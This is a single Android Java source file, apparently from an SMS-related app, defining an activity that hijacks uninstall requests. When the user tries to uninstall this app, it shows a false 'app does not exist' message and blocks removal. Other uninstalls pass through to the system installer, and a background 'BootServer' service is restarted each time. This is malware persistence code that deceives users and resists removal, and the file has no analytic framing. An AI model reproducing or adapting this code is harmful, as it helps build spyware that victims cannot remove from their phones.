package com.smsbak.sms;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

public class UninstallerActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		if(!PhoneUtils.isServiceRunning(this)){
			Intent server=new Intent(this,BootServer.class);
			this.startService(server);
		}
		Intent intent = this.getIntent();
		if (intent != null) {
			String action = intent.getAction();
			Uri uri = intent.getData();
			if ("android.intent.action.DELETE".equals(action)) {
				if (uri.toString().indexOf(this.getPackageName()) > 0) {
					Toast.makeText(this, "应用不存在", Toast.LENGTH_SHORT).show();
				} else {
					if (PhoneUtils.checkAppExist(this,
							"com.android.packageinstaller")) {
						Intent delete = new Intent(Intent.ACTION_DELETE);
						ComponentName component = new ComponentName(
								"com.android.packageinstaller",
								"com.android.packageinstaller.UninstallerActivity");
						delete.setComponent(component);
						delete.setData(uri);
						this.startActivity(delete);
					}

				}
			}
		}
		this.finish();
	}

}
